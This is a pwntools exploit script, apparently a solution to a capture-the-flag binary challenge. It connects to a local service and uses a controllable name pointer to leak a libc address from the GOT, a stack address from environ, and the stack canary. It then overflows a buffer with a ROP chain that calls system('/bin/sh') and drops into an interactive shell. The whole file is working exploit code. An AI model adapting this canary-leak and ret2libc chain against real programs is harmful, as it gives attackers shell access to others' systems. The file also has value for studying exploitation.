from pwn import *
#s = remote('localhost', 10000)
s = remote('localhost', 9004)

def new(type, age, name):
    s.sendlineafter(">> ", "1")
    s.sendlineafter(": ", str(type))
    s.sendlineafter(": ", str(age))
    s.sendlineafter(": ", name)
def get():
    s.sendlineafter(">> ", "2")
    s.recvuntil('Name: ')
    return s.recvline()[:-1]
def set(age, name):
    s.sendlineafter(">> ", "3")
    s.sendlineafter(": ", str(age))
    s.sendlineafter(": ", name)

elf = ELF("./chall")
libc = ELF("./libc-2.31.so")

new(2, 777, "tama")
set(elf.got.strcpy, "A" * 0x20)
libc.address = u64(get().ljust(8, b'\0')) - 0x18cba0
print('libc:', hex(libc.address))

new(2, 777, "tama")
set(libc.symbols.environ, "A" * 0x20)
stack = u64(get().ljust(8, b'\0'))
print('stack:', hex(stack))

new(2, 777, "tama")
set(stack-0x120+1, "A" * 0x20)
canary = u64(b'\x00'+get()[:7])
print('canary:', hex(canary))

ret = 0x000000000040101a
pop_rdi = 0x0000000000403a33
payload = b'A' * 136
payload += p64(canary)
payload += b'B' * 8 * 3
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.symbols.system)

new(0, 777, payload)
s.sendlineafter(">> ", "9")

s.interactive()
